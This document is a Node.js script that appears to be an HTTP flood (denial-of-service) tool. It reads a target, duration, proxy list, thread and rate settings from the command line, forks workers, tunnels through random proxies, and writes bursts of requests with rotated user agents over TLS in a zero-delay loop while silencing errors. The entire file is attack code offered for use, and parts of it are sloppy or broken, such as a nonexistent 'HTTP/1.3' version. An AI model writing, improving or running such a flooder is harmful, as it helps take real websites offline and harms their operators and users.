const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const {
    constants
} = require('crypto');
var theJar = request_2.jar();
const path = require("path");
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'DEP0123'];
ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'DEP0123'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function() {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);

global.logger = function() {
    var first_parameter = arguments[0];

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    console.log.apply(console, [formatConsoleDate(new Date()) + first_parameter]);
};

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
var target = process.argv[2];
var time = process.argv[3];
var thread = process.argv[5];
var rate = process.argv[6];
var method = process.argv[7];


var fileName = __filename;
var file = path.basename(fileName);


process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

global.logger = function() {
    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    console.log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
};

var parsed = url.parse(target);
process.setMaxListeners(15);


const cluster = require('cluster');
const numCPUs = thread;

if (cluster.isPrimary) {

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`The cat began to scrub  ${worker.process.pid}`);
    });
} else {

    setInterval(function() {

        var aa = getRandomNumberBetween(100, proxies.length);
        var proxy = proxies[Math.floor(Math.random() * aa)];
        proxy = proxy.split(':');

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
        });

        var tlsSessionStore = {};

        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host + ':443'
        }, function() {
            req.setSocketKeepAlive(true);
        });

        req.on('connect', function(res, socket, head) { //open raw request
            tls.authorized = true;
            tls.sync = true;
            var TlsConnection = tls.connect({
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
                honorCipherOrder: true,
                requestCert: true,
                host: parsed.host,
                port: 80,
                secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, function() {

                for (let j = 0; j < rate; j++) {
                    TlsConnection.write(`${method} ` + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
                }
            });

            TlsConnection.on('disconnected', () => {
                TlsConnection.destroy();
            });

            TlsConnection.on('timeout', () => {
                TlsConnection.destroy();
            });

            TlsConnection.on('error', (err) => {
                TlsConnection.destroy();
            });

            TlsConnection.on('data', (chunk) => {
                setTimeout(function() {
                    return delete TlsConnection
                }, 10000);
            });

            TlsConnection.on('end', () => {
                TlsConnection.destroy();
            });

        }).end()
    }, 0);
}



setTimeout(() => {
    process.exit(1);
}, time * 1000)


logger('STARTING  :: ', target, 'FOR', time, 'MS');
